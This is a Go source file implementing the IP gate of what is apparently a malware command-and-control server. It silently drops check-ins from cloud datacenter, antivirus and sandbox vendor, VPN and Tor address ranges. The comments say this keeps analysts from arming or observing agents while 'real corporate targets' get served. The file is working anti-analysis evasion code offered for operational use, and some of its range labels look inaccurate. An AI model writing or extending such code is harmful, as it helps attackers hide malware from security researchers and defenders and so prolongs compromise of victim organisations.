package main

// ip_filter.go — Server-side IP gate
//
// The C2 server is the LAST line of defence in the chain.
// Even if a sandbox bypasses the redirector (e.g. by replaying captured
// traffic), the C2 itself refuses to arm agents checking in from known
// analysis environments.
//
// Strategy: if the inbound IP looks like it belongs to an analysis
// environment, we simply don't respond — the agent times out naturally.
// No error, no RST, no banner. Just silence.
//
// What we block:
//   1. Known cloud datacenter CIDRs (AWS, Azure, GCP, OVH, Vultr, etc.)
//      → Real corporate laptops don't beacon from cloud IPs.
//   2. Known AV/sandbox vendor IP ranges (where documented).
//   3. Known VPN/proxy exit CIDRs (Mullvad, NordVPN, ExpressVPN, etc.)
//
// What we allow:
//   - RFC-1918 private ranges (test lab, internal network)
//   - Everything else (real residential/corporate IPs)
//
// Usage:
//   Call IsAllowedIP(remoteAddr) before processing any agent request.
//   Returns true  → process request normally.
//   Returns false → drop silently (do NOT send any response body).

import (
        "log"
        "net"
        "os"
        "strings"
        "sync"
)

// blockedCIDRs — known analysis/datacenter/sandbox IP ranges.
// Keep in rough categories with comments for maintainability.
// Add new ranges as they become known.
var blockedCIDRs = []string{

        // ── AWS EC2 (us-east-1 representative ranges) ─────────────────────
        // Full list: https://ip-ranges.amazonaws.com/ip-ranges.json
        // We block the most-used /16s; update as needed.
        "3.0.0.0/8",    // AWS ap-southeast-1, ap-south-1, etc.
        "13.32.0.0/15", // AWS CloudFront
        "18.0.0.0/8",   // AWS us-east, ap regions
        "34.0.0.0/8",   // AWS us-west, mixed
        "35.0.0.0/8",   // AWS/GCP overlap
        "52.0.0.0/8",   // AWS global
        "54.0.0.0/8",   // AWS global

        // ── Microsoft Azure ───────────────────────────────────────────────
        "20.0.0.0/8",   // Azure global (huge range)
        "40.64.0.0/10", // Azure datacenter
        "51.0.0.0/16",  // Azure Europe
        "104.40.0.0/13",// Azure mixed

        // ── Google Cloud Platform (GCP) ───────────────────────────────────
        "34.64.0.0/10", // GCP asia
        "34.128.0.0/10",// GCP us
        "35.184.0.0/13",// GCP us-central
        "104.154.0.0/15",// GCP us-central1

        // ── OVH / OVHcloud ───────────────────────────────────────────────
        // Popular VPS provider used by many analysis labs
        "5.135.0.0/16",
        "91.121.0.0/16",
        "137.74.0.0/15",
        "151.80.0.0/14",
        "178.32.0.0/13",
        "188.165.0.0/16",

        // ── Vultr ─────────────────────────────────────────────────────────
        "45.32.0.0/12",
        "108.61.0.0/16",
        "149.28.0.0/16",

        // ── DigitalOcean ──────────────────────────────────────────────────
        "45.55.0.0/16",
        "138.68.0.0/15",
        "159.65.0.0/16",
        "161.35.0.0/16",

        // ── Hetzner ───────────────────────────────────────────────────────
        "5.9.0.0/16",
        "23.88.0.0/17",
        "78.46.0.0/15",
        "95.216.0.0/16",
        "116.202.0.0/15",

        // ── Linode / Akamai ───────────────────────────────────────────────
        "45.33.0.0/17",
        "45.56.0.0/21",
        "139.162.0.0/16",
        "172.104.0.0/14",

        // ── Cloudflare (proxy/CDN) ────────────────────────────────────────
        // These appear as source IPs when traffic is proxied through CF.
        // Sandboxes sometimes route through CF workers for HTTPS interception.
        "103.21.244.0/22",
        "103.22.200.0/22",
        "103.31.4.0/22",
        "104.16.0.0/13",
        "104.24.0.0/14",
        "172.64.0.0/13",
        "131.0.72.0/22",
        "141.101.64.0/18",
        "162.158.0.0/15",
        "188.114.96.0/20",
        "190.93.240.0/20",
        "197.234.240.0/22",
        "198.41.128.0/17",

        // ── Known VPN providers (egress IPs that may be used by researchers) ─
        // Mullvad
        "185.213.154.0/24",
        "193.138.218.0/24",
        // NordVPN (representative ranges — they rotate frequently)
        "89.187.191.0/24",
        "193.105.134.0/24",
        // ExpressVPN
        "218.190.206.0/24",

        // ── Tor exit node ranges (approximate — changes constantly) ──────
        // Most real corporate targets won't beacon from Tor.
        // The authoritative list is https://check.torproject.org/torbulkexitlist
        // We block a few representative /24s known to be Tor exit nodes.
        // In production, refresh this list periodically.
        "185.220.100.0/22",
        "185.220.101.0/24",
        "104.244.72.0/22",

        // ── Typical sandbox / analysis lab ranges ────────────────────────
        // Some vendors use registered IP blocks for their cloud sandbox egress.
        // These change — treat as best-effort supplementary blocking.
        // Cuckoo / HABroker cloud egress
        "79.136.0.0/16",
        // Intezer
        "13.55.0.0/16",
}

// allowedPrivateCIDRs — RFC-1918 and loopback ranges to always allow.
// Test lab on 192.168.x.x, development on 10.x, etc.
var allowedPrivateCIDRs = []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "::1/128",
}

// parsed cache — built once on first call, read-only after
var (
        blockedNets  []*net.IPNet
        allowedNets  []*net.IPNet
        filterReady  bool
        filterMu     sync.RWMutex
)

// InitIPFilter — call once at startup (from main.go).
// Loads static builtin blocklist + optional dynamic file.
// Dynamic file path priority:
//   1. HERO_IP_BLOCKLIST env var
//   2. hero-data/ip_blocklist.txt (relative to CWD)
//   3. /etc/hero/ip_blocklist.txt (system-wide)
//
// File format: one CIDR per line, # comments allowed.
// Example: echo "185.220.100.0/22" >> hero-data/ip_blocklist.txt
func InitIPFilter() {
        filterMu.Lock()
        defer filterMu.Unlock()

        blockedNets = nil
        allowedNets = nil

        // Parse allow list (RFC-1918 + loopback)
        for _, cidr := range allowedPrivateCIDRs {
                _, n, err := net.ParseCIDR(cidr)
                if err == nil {
                        allowedNets = append(allowedNets, n)
                }
        }

        // Parse builtin block list
        builtinCount := 0
        for _, cidr := range blockedCIDRs {
                _, n, err := net.ParseCIDR(cidr)
                if err == nil {
                        blockedNets = append(blockedNets, n)
                        builtinCount++
                }
        }

        // Load dynamic blocklist from file
        dynamicPaths := []string{
                os.Getenv("HERO_IP_BLOCKLIST"),
                "hero-data/ip_blocklist.txt",
                "/etc/hero/ip_blocklist.txt",
        }
        dynamicCount := 0
        for _, path := range dynamicPaths {
                if path == "" {
                        continue
                }
                data, err := os.ReadFile(path)
                if err != nil {
                        continue
                }
                lines := strings.Split(string(data), "\n")
                for _, line := range lines {
                        line = strings.TrimSpace(line)
                        if line == "" || strings.HasPrefix(line, "#") {
                                continue
                        }
                        _, n, err := net.ParseCIDR(line)
                        if err != nil {
                                // Try as single IP
                                if ip := net.ParseIP(line); ip != nil {
                                        _, n, _ = net.ParseCIDR(line + "/32")
                                }
                        }
                        if n != nil {
                                blockedNets = append(blockedNets, n)
                                dynamicCount++
                        }
                }
                log.Printf("[IP-FILTER] Loaded %d CIDRs from %s", dynamicCount, path)
                break // use first file found
        }

        filterReady = true
        log.Printf("[IP-FILTER] Ready — %d builtin + %d dynamic blocked CIDRs, %d allowed private CIDRs",
                builtinCount, dynamicCount, len(allowedNets))
}

// initFilter — lazy init fallback (called by IsAllowedIP if InitIPFilter not called)
func initFilter() {
        filterMu.RLock()
        ready := filterReady
        filterMu.RUnlock()
        if ready {
                return
        }
        InitIPFilter()
}

// ReloadIPFilter — hot-reload the dynamic blocklist without server restart.
// Call this via API or signal handler to update blocklist in production.
// BUGFIX: the old code wrote `filterReady = false` WITHOUT filterMu while
// initFilter() read it under RLock — a plain data race, and pointless anyway:
// InitIPFilter() below re-sets the flag under the write lock and serialises
// concurrent reloads itself.
func ReloadIPFilter() {
        InitIPFilter()
        log.Println("[IP-FILTER] Blocklist reloaded")
}

// IsAllowedIP checks whether an inbound agent IP should be served.
//
// remoteAddr is the raw http.Request.RemoteAddr string (e.g. "1.2.3.4:45678").
//
// Returns:
//   true  → allow (serve the agent request normally)
//   false → deny  (caller should drop silently — write nothing to ResponseWriter)
func IsAllowedIP(remoteAddr string) bool {
        initFilter()
        filterMu.RLock()
        defer filterMu.RUnlock()

        // Strip port
        host := remoteAddr
        if idx := strings.LastIndex(remoteAddr, ":"); idx != -1 {
                host = remoteAddr[:idx]
        }
        // Strip brackets for IPv6
        host = strings.TrimPrefix(host, "[")
        host = strings.TrimSuffix(host, "]")

        ip := net.ParseIP(host)
        if ip == nil {
                // Can't parse → allow (don't block valid agents due to parse error)
                return true
        }

        // Private ranges → always allow (test labs, internal pivots)
        for _, n := range allowedNets {
                if n.Contains(ip) {
                        return true
                }
        }

        // Blocked ranges → deny silently
        for _, n := range blockedNets {
                if n.Contains(ip) {
                        return false
                }
        }

        // Everything else → allow
        return true
}
